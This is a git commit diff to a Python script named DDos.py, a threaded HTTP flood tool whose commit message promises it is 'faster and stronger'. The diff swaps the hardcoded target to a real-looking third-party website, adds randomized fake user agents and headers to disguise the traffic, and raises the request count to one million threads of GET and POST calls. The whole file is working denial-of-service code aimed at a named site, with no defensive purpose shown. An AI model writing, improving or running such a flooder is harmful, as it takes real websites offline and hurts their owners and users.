187e0c4f3fe54f97dcb0e472554cf0a075c3eb41
Nekszii <ezorito437@gmail.com>
2025-03-13 17:44:41 +0100

    Update DDos.py
    New update faster and stronger!

--- DDos.py
+++ DDos.py
@@ -1,29 +1,43 @@
 import requests
 import threading
-
+import random
+import time
+from fake_useragent import UserAgent
+from fake_headers import Headers
 
 print("1. DDos Attack\n")
-#Variables
+
+
+# Variables
 Choice = input("Enter your choice: ")
-Data = {"Key": "ABCDEFGHIJKLMNOPQRSTUVWXYZ"}
-Host = "https://www.redwolfsecurity.com/services/"
+ua = UserAgent()
+
+Host = "https://www.wiesgeerts.be/"
+headers = Headers().generate()
+headers['User-Agent'] = ua.random
 
 def DDosAttack():
     try:
-
-        response = requests.post(Host, data=Data)
-        print(f"The status is: {response.status_code}")
+        methods = [
+            lambda: requests.get(Host, headers=headers),
+            lambda: requests.post(Host, headers=headers)
+        ]
+        method = random.choice(methods)
+        response = method() 
+        print(f"Status Code: {response.status_code}\n")
+        print(f"Request Headers: {response.request.headers}\n")
 
     except Exception as e:
         print(f"Error: {e}")
+        time.sleep(5)
+
 threads = []
 match Choice:
     case "1":
-        for _ in range(100000):
+        for _ in range(1000000):
             thread = threading.Thread(target=DDosAttack)
             threads.append(thread)
             thread.start()
-        
+
         for thread in threads:
             thread.join()
-            
